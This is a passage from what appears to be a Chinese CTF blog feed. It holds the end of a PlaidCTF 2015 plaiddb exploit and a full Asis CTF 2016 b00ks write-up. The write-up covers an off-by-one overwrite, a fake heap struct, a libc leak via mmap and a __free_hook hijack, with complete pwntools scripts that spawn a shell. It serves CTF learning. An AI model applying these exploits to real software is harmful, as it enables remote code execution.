punctuation">)</span>__malloc_hook_addr <span class="token operator">=</span> libc_leak <span class="token operator">-</span> <span class="token number">88</span> <span class="token operator">-</span> <span class="token number">0x10</span>libc_base <span class="token operator">=</span> __malloc_hook_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base: '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 这些块物理相连，a*58 之后正好是 5 块的 size 和 fd，修改即可控制下一个 fast bin 的位置</span><span class="token comment"># -0x10 是为了留出指针空间，-3 是为了把指针所指的 __malloc_hook 处的 7f 地址提前，当成 pre_size 相关内容，否则 fake_fast bin 格式不符合要求</span><span class="token comment"># debug()</span>PUT<span class="token punctuation">(</span><span class="token string">b'fastatk'</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x58</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>__malloc_hook_addr <span class="token operator">-</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>PUT<span class="token punctuation">(</span><span class="token string">b'prepare'</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'prepare data'</span><span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x4527a</span>   <span class="token comment"># 0x45226 0x4527a 0xf03a4 0xf1247</span>PUT<span class="token punctuation">(</span><span class="token string">b'attack'</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'DEL'</span><span class="token punctuation">)</span> <span class="token comment"># malloc(8) 出发 one_gadget</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb32.png" alt="【plaidctf 2015】plaiddb32.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Asis CTF 2016】b00ks</title>
      <link href="/posts/18c02ebd.html"/>
      <url>/posts/18c02ebd.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>利用 off-by-one 漏洞修改指向堆的指针，并在修改后的指针指向的堆地址处伪造一个堆块</p></li><li><p><mark>利用 <code>mmap</code> 分配的内存与 libc 之前存在固定的偏移的特点，推算出 libc 的基地址</mark></p></li><li><p><mark>由于 <code>unsorted bin</code> 是双向链表，利用第一个 <code>unsorted bin</code> 的 <code>bk</code> 指针指向 libc 中的地址的特点，根据偏移得到 <code>__malloc_hook</code> 真实地址，进而通过 <code>__malloc_hook</code> 的 libc 偏移计算 libc 基地址</mark></p></li><li><p>通过劫持 <code>__free_hook</code> 为 <code>system()</code> 或 one_gadget 来获得 shell</p></li></ul><hr><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">【Asis CTF 2016】b00ks</a></p><hr><h1 id="思路一（mmap）"><a href="#思路一（mmap）" class="headerlink" title="思路一（mmap）"></a>思路一（mmap）</h1><blockquote><p>本地环境：Glibc 2.23</p></blockquote><p>查看保护：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks1.png" alt="【Asis CTF 2016】b00ks1.png"></p><p>IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks2.png" alt="【Asis CTF 2016】b00ks2.png"></p><p>一个菜单题，根据功能选项，将相应功能的函数重命名</p><p><code>Menu()</code> 菜单：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks3.png" alt="【Asis CTF 2016】b00ks3.png"></p><p><code>Create()</code> 创建：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks5.png" alt="【Asis CTF 2016】b00ks5.png"></p><p><code>Delete()</code> 删除：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks6.png" alt="【Asis CTF 2016】b00ks6.png"></p><p><code>Edit()</code> 编辑：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks7.png" alt="【Asis CTF 2016】b00ks7.png"></p><p><code>Print()</code> 打印：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks8.png" alt="【Asis CTF 2016】b00ks8.png"></p><p><code>Change()</code> 修改作者名：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks9.png" alt="【Asis CTF 2016】b00ks9.png"></p><p>程序在刚开始执行 <code>Menu()</code> 显示菜单之前，会在 <code>Change()</code> 中先让输入作者名 <code>author name</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks4.png" alt="【Asis CTF 2016】b00ks4.png"></p><p>这里的输入由自定义的 <code>my_read()</code> 实现：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks10.png" alt="【Asis CTF 2016】b00ks10.png"></p><p>仔细观察 <code>my_read()</code> 可以发现，这里是存在漏洞的：如果我们输入的字符串长度 <code>a2 = 1</code>，实际上会读入 2 个字符，第二个字符 <code>&#39;\n&#39;</code> 会被赋值为 <code>&#39;\x00&#39;</code></p><p>作者名 <code>author name</code> 写入的地址位于 BSS 段的 <code>unk_202040</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks11.png" alt="【Asis CTF 2016】b00ks11.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks12.png" alt="【Asis CTF 2016】b00ks12.png"></p><p>在 <code>Create()</code> 中创建书时，如果已存在的书的数量 <code>v2 &lt; 20</code>（未存满），会通过 <code>malloc</code> 分配 0x20 的空间来存放书的结构</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks13.png" alt="【Asis CTF 2016】b00ks13.png"></p><p>并将 <code>malloc</code> 分配的空间首地址存储在 <code>off_202010 + v2</code> 的地方，可以看到其存放在 BSS 段的 <code>unk_202060</code> 处：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks14.png" alt="【Asis CTF 2016】b00ks14.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks16.png" alt="【Asis CTF 2016】b00ks16.png"></p><p>分析可知，书的结构包括：</p><ul><li>书的序号 <code>book_id</code></li><li>书名 <code>name</code></li><li>书的描述 <code>description</code></li><li>书的描述的大小 <code>size</code></li></ul><p>为了方便理解，用图表示出来就是这样：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks15.png" alt="【Asis CTF 2016】b00ks15.png"></p><p>上图中，橙色区域存储作者名 <code>author name</code>，绿色区域存储的是书的数组 <code>book[]</code></p><blockquote><p><strong>有多少本书就有多少个 <code>book[]</code> 数组元素，<code>book[]</code> 的每一个数组元素都是一个指针，指向堆中的一个结构体</strong></p><p>这个结构体有四个属性：书的序号 <code>book_id</code>、书名 <code>name</code>、书的描述 <code>description</code> 和书的描述的大小 <code>size</code></p></blockquote><p>由于这里 <code>unk_202040</code> 和 <code>unk_202060</code> 刚好相距 0x20，因此 <code>my_read(off_202018, 32LL)</code> 处存在 off-by-one 漏洞，刚好溢出 1 字节</p><p>为了泄露出堆中的地址，可以借助存储在 <code>unk_202060</code> 中的指针，而在 <code>Print()</code> 中会将 <code>unk_202040</code> 处存储的 <code>author name</code> 通过 <code>%s</code> 打印出来：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks17.png" alt="【Asis CTF 2016】b00ks17.png"></p><p>因此，我们首先向 <code>unk_202040</code> 写入 0x20 个字节，将空间全部填满，这样就不存在 <code>&#39;\x00&#39;</code> 截断，由于 <code>my_read()</code> 还会多写入 1 字节 <code>&#39;\x00&#39;</code> 覆盖 <code>book[0]</code> 的最低位，但是不影响，因为当我们创建 <code>book[0]</code> 的时候多出的那 1 字节 <code>&#39;\x00&#39;</code> 又会被 <code>book[0]</code> 存储的指针给覆盖掉</p><p>当我们创建好 <code>book[0]</code> 后，此时 <code>unk_202040</code> 与 <code>book[0]</code> 是直接相连的，中间不存在 <code>&#39;\x00&#39;</code> 截断，因此我们只需要调用一次 <code>Print()</code> 就可以泄露出 <code>book[0]</code> 存储的指针</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks18.png" alt="【Asis CTF 2016】b00ks18.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks19.png" alt="【Asis CTF 2016】b00ks19.png"></p><p>创建两本书进行测试，发现两个 <code>book[]</code> 存储的指针之间的偏移是 0x30：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks21.png" alt="【Asis CTF 2016】b00ks21.png"></p><p>堆中的存储结构如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks22.png" alt="【Asis CTF 2016】b00ks22.png"></p><p>因此根据 <code>book[0]</code> 存储的指针我们可以推算出 <code>book[1]</code> 存储的指针，即：<code>book[1] = book[0] + 0x30</code></p><p>由于这个题开启了 PIE，我们暂时无法泄露 libc 的基地址</p><p>但发现 <code>Create()</code> 创建书的时候，大小是由我们控制的：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks20.png" alt="【Asis CTF 2016】b00ks20.png"></p><p>因此我们可以让堆以 <code>mmap</code> 模式进行拓展，即：设定一个很大的尺寸（大于等于 <code>128KB</code>），创建一个 <code>book[1]</code></p><blockquote><p>因为 <code>brk</code> 是直接拓展原来的堆，而 <code>mmap</code> 会单独映射一块内存</p><p><strong><code>mmap</code> 分配的内存与 libc 之前存在固定的偏移，因此可以推算出 libc 的基地址</strong></p></blockquote><p>由于我们还可以再次使用 <code>Change()</code> 功能来写入作者名 <code>author name</code>，此时如果写入 0x20 字节，则溢出的一字节 <code>&#39;\x00&#39;</code> 会直接将已有的 <code>book[0]</code> 存储的指针最低位覆盖掉，从而改变了 <code>book[0]</code> 指向堆中的地址</p><p>可以看到，原本 <code>book[0]</code> 存储的指针最低位为 <code>&#39;\x60&#39;</code>，此时已被覆盖为 <code>&#39;\x00&#39;</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks25.png" alt="【Asis CTF 2016】b00ks25.png"></p><p>进而我们可以通过 <code>Edit()</code> 功能修改 <code>book[0] -&gt; description</code> 的内容来伪造 <code>book[0]</code> 的结构体，此时伪造的 <code>book[0] -&gt; name</code> 和 <code>book[0] -&gt; description</code> 都可以由我们来定义</p><blockquote><p>注意：</p><p>由于我们覆盖了原本 <code>book[0]</code> 存储的指针最低位为 <code>&#39;\x00&#39;</code>，因此伪造的 <code>book[0]</code> 结构体首地址应该在地址最低位为 <code>&#39;\x00&#39;</code> 的地方，偏移为 0x40，因此先填充 0x40 的垃圾数据</p></blockquote><p>伪造前：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks23.png" alt="【Asis CTF 2016】b00ks23.png"></p><p>伪造后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks24.png" alt="【Asis CTF 2016】b00ks24.png"></p><p>这里我们将伪造的 <code>book[0] -&gt; name</code> 和 <code>book[0] -&gt; description</code> 都设置为 <code>book[1]</code> 的 <code>book[1] -&gt; name</code> 的地址</p><p>因为此时我们只要能泄露 <code>book[1] -&gt; name</code> 就可以通过 <code>book[1] -&gt; name</code> 与 libc 基地址的偏移来计算出 libc 基地址了</p><p>通过 GDB 得到 <code>book[1] -&gt; name</code> 与 libc 基地址的偏移为 <code>0x5b0010</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks26.png" alt="【Asis CTF 2016】b00ks26.png"></p><p>利用 <code>(book[1] -&gt; name) - 0x5b0010</code> 泄露出 libc 基地址后，直接劫持 <code>__free_hook</code> 为 <code>system()</code> 地址，然后通过 <code>Delete()</code> 功能调用 <code>free()</code> 实现 <code>system(/bin/sh)</code></p><p>也可以直接劫持 <code>__free_hook</code> 为 one_gadget 来 getshell</p><hr><h1 id="脚本一"><a href="#脚本一" class="headerlink" title="脚本一"></a>脚本一</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./b00ks"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./b00ks"</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Create</span><span class="token punctuation">(</span>name_size<span class="token punctuation">,</span> name<span class="token punctuation">,</span> des_size<span class="token punctuation">,</span> des<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>name_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>des_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>des<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Delete</span><span class="token punctuation">(</span>book_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>book_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Edit</span><span class="token punctuation">(</span>book_id<span class="token punctuation">,</span> new_des<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>book_id<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>new_des<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Change</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Enter author name: '</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>   <span class="token comment"># 将 author name 的空间填充满，使其不存在 '\x00'</span>Create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'bbbb'</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'cccc'</span><span class="token punctuation">)</span>Print<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>book1_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'book1_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>book1_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>book2_addr <span class="token operator">=</span> book1_addr <span class="token operator">+</span> <span class="token number">0x30</span>   <span class="token comment"># 根据调试可知，两个堆块之间的偏移为 0x30</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'book2_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>book2_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>Create<span class="token punctuation">(</span><span class="token number">0x21000</span><span class="token punctuation">,</span> <span class="token string">b'cccc'</span><span class="token punctuation">,</span> <span class="token number">0x21000</span><span class="token punctuation">,</span> <span class="token string">b'dddd'</span><span class="token punctuation">)</span>   <span class="token comment"># 以 mmap 方式创建堆块</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x40</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>book2_addr <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>book2_addr <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>   <span class="token comment"># 伪造 book[0]</span><span class="token comment"># debug()</span>Change<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>   <span class="token comment"># 覆盖 book[0] 的最低位，改变其指向的地址为伪造的 book[0]</span>Print<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Name: '</span><span class="token punctuation">)</span>book2_name_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 泄露出 book[1] -> name</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'book2_name_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>book2_name_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> book2_name_addr <span class="token operator">-</span> <span class="token number">0x5b0010</span>   <span class="token comment"># 根据偏移计算 libc 基地址</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>free_hook_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>one_gadget_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x4527a</span>   <span class="token comment"># 0x45226 0x4527a 0xf03a4 0xf1247</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'bin_sh_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'one_gadget_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># system(/bin/sh) 和 one_gadget 选其一即可</span>Edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Edit(1, p64(0) + p64(free_hook_addr))</span><span class="token comment"># Edit(2, p64(one_gadget_addr))</span>Delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果一"><a href="#结果一" class="headerlink" title="结果一"></a>结果一</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks27.png" alt="【Asis CTF 2016】b00ks27.png"></p><hr><h1 id="思路二（unsorted-bin）"><a href="#思路二（unsorted-bin）" class="headerlink" title="思路二（unsorted bin）"></a>思路二（unsorted bin）</h1><blockquote><p>本地环境：Glibc 2.23</p></blockquote><p>根据前面的分析我们知道，关键在于如何泄露 libc 的基地址</p><p>在思路一中，通过 <code>mmap</code> 方式分配的堆地址与 libc 